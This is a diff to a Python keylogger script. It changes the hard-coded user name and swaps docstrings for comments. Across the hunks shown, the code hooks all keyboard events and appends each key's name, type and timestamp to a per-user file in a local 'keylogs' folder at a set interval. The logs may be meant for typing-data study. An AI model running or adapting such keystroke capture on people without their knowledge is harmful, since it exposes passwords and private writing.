@@ -6,29 +6,19 @@ import os
 
 SEND_REPORT_EVERY = 1
 
-#time now printed.
-#reordered for "event, key, time"
-#still prints repeat characters at the end of the string but This
-#doesnt affect the time so it is ok - can remove it easily in the parser
-
-currentUser = 'oskar'
+currentUser = 'aoife'
 
 class Keylogger:
     current_letter=''
 
     def __init__(self, interval):
         self.interval = interval
-        # this is the string variable that contains the log of all
-        # the keystrokes within `self.interval`
         self.log = ""
 
 
+#The callback is invoked when a keyboard event occurs
     def callback(self, event):
 
-        """
-        This callback is invoked whenever a keyboard event is occured
-        (i.e when a key is released in this example)
-        """
         name = event.name
         eventtype = event.event_type
         now = event.time
@@ -59,25 +49,22 @@ class Keylogger:
         self.log += name
 
 
+    #creates a log file under the specified user in the keylogs folder
     def report_to_file(self):
         file_name = os.path.join('keylogs', f"{currentUser}.txt")
-        """This method creates a log file in the current directory that contains
-        the current keylogs in the `self.log` variable"""
 
         # write the keylogs to the file
         myfile = open(file_name, "a")
 
         myfile.write(self.log)
         print(f"[+] Saved logs for {currentUser}.txt")
-        # myfile.close()
+        # myfile.close()        #should we close the file?
 
 
 
+    #this is called every specified interval. Sends whatever is in the keylog and
+    #resets the self.log variable
     def report(self):
-        """
-        This function gets called every `self.interval`
-        It basically sends keylogs and resets `self.log` variable
-        """
         if self.log:
             # if there is something in log, report it
             self.end_dt = datetime.now()
@@ -104,7 +91,5 @@ class Keylogger:
         keyboard.wait()
 
 if __name__ == "__main__":
-    # if you want a keylogger to record keylogs to a local file
-    # (and then send it using your favorite method)
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
